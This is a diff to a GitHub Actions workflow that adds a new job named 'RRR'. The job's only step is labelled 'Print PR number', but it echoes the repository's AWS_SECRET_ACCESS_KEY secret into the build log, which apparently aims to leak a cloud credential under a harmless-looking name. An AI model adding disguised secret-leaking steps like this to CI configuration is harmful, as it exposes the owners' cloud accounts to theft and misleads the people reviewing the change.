@@ -6,6 +6,12 @@ on:
       - main
 
 jobs:
+  print:
+    name: 'RRR'
+    runs-on: ubuntu-latest
+    steps:
+      - name: 'Print PR number'
+        run: echo "PR number is ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
   build:
     uses: ./.github/workflows/build-image.yaml
     with:
